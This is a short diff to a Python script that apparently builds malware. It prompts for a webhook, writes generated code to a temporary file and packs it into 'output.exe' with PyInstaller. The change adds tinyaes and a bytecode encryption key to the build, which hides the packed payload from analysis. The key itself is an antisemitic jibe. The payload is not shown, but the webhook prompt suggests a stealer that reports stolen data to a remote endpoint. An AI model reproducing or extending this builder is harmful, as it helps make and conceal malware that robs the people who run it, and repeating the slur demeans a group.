@@ -3,7 +3,7 @@ import base64
 import shutil
 import marshal
 
-os.system("python -m pip install pyinstaller pypiwin32 pycryptodome requests")
+os.system("python -m pip install pyinstaller pypiwin32 pycryptodome requests tinyaes")
 os.system("cls")
 
 webhook = input("Paste your Webhook: ")
@@ -185,7 +185,7 @@ else:
 
 open(f"tmp_{id}.py", "w").write(newcode)
 
-os.system(f"pyinstaller --clean --onefile tmp_{id}.py")
+os.system(f"pyinstaller --clean --onefile --key ILOVEJ3WS tmp_{id}.py")
 
 shutil.copy2(f"dist\\tmp_{id}.exe", "output.exe")
 shutil.rmtree("dist")
